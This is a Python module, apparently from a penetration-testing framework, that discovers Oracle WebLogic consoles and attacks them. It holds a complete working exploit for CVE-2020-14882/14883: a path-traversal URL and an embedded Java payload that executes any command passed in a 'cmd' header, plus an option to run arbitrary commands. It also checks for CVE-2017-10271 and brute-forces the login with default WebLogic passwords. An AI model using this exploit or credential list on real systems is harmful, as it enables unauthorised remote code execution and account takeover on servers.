import os.path
import re

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from utils.parsers import *
from lib.httpscan.http import HTTP

creds = [
    'weblogic:weblogic',
    'weblogic:welcome1',
    'weblogic:weblogic1',
    'weblogic:Weblogic1',
]

weblogic_urls = [
    'console',
]

version_pattern = re.compile('<p id="footerVersion">[^:]+: (\S+)</p>')

class Module:
    name = 'Weblogic'
    description = 'Discover and exploit Weblogic (bruteforce, CVE-2017-10271, CVE-2020-14882/3)'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        for url in weblogic_urls:
            url = os.path.join(target['path'], url)
            res = http.get(url)

            if res and res['code'] in [200] and 'weblogic' in res['title'].lower():
                http_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'protocol': 'tcp',
                    'service': 'http',
                    'url': http.url(url),
                    'http': {
                        'path': url,
                        'code': res['code'],
                        'server': res['server'],
                        'title': res['title'],
                        'content-type': res['content-type'],
                    },
                    'tags': ['weblogic']
                }
                DB.insert_http_url(http_info)

                version = 'unknown'
                m = version_pattern.search(res['html'])
                if m:
                    version = m.group(1)

                Output.highlight({'target': http.url(url), 'message': 'WebLogic interface: %s' % version})

                # Check for CVE-2017-10271

                random_str = gen_random_string()
                exploit_url = os.path.join(target['path'], 'wls-wsat/CoordinatorPortType')
                output = http.get(exploit_url)
                if output and output['code'] in [200] and 'web services' in output['title'].lower():
                    Output.vuln({'target': http.url(url), 'message': 'Weblogic probably vulnerable to RCE (CVE-2017-10271)'})

                    vuln_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(exploit_url),
                        'name': 'Weblogic unauthenticated RCE (CVE-2017-10271)',
                        'description': 'Weblogic service %s is probably vulnerable to unauthenticated RCE (CVE-2017-10271)' % http.url(exploit_url),
                    }
                    DB.insert_vulnerability(vuln_info)

                # Check for CVE-2020-14882

                random_str = gen_random_string()
                exploit_url = os.path.join(target['path'], 'console/images/%252e%252e%252fconsole.portal')
                payload = """_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String cmd = req.getHeader("cmd");
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
if (cmd != null) {
    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\\A").next();
    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();
    res.getWriter().write("");
}executeThread.interrupt();
");"""
                output = http.post(exploit_url, payload, headers={'cmd': 'echo %s' % random_str, 'Content-Type': 'application/x-www-form-urlencoded'})

                if output and output['code'] in [200] and random_str in output['html']:
                    Output.vuln({'target': http.url(url), 'message': 'Weblogic vulnerable to RCE (CVE-2020-14882,CVE-2020-14883)'})

                    vuln_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(url),
                        'name': 'Weblogic unauthenticated RCE (CVE-2020-14882,CVE-2020-14883)',
                        'description': 'Weblogic service %s is vulnerable to unauthenticated RCE (CVE-2020-14882,CVE-2020-14883)' % http.url(url),
                    }
                    DB.insert_vulnerability(vuln_info)

                    if args['exec']:
                        output = http.post(exploit_url, payload, headers={'cmd': args['exec'], 'Content-Type': 'application/x-www-form-urlencoded'})
                        Output.highlight({'target': http.url(url), 'message': 'RCE exploitation output:\n%s' % output['html']})

                # bruteforce login form

                form = None
                for f in res['forms']:
                    if not 'name' in f:
                        continue

                    if 'login' in f['name'].lower():
                        form = f
                        break

                if not form:
                    Output.error({'target': http.url(url), 'message': 'Weblogic: Unable to find authentication form'})
                else:

                    if args['bruteforce']:
                        Output.highlight({'target': http.url(url), 'message': 'Starting bruteforce...'})
                        for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                            username, password = cred.split(':')

                            data = http.get(url)

                            if not data:
                                continue

                            form = None
                            for f in data['forms']:
                                if not 'name' in f:
                                    continue

                                if 'login' in f['name'].lower():
                                    form = f
                                    break

                            if not form:
                                continue

                            for arg in form['args']:
                                if 'username' in arg.lower():
                                    form['args'][arg] = username

                                if 'password' in arg.lower():
                                    form['args'][arg] = password

                            headers = {
                                'Referer': data['response_url'],
                            }

                            res = http.send_form(url, form, html=data['html'], cookies=data['cookies'], headers=headers)

                            after_auth_form = None
                            for f in res['forms']:
                                if not 'name' in f:
                                    continue

                                if 'login' in f['name'].lower():
                                    after_auth_form = f
                                    break

                            if after_auth_form != None:
                                continue

                            Output.success({'target': http.url(url), 'message': 'Authentication success to Weblogic with login %s and password %s' % (username, password)})

                            cred_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(url),
                                'type': 'password',
                                'username': username,
                                'password': password,
                                'tags': ['weblogic'],
                            }
                            DB.insert_credential(cred_info)
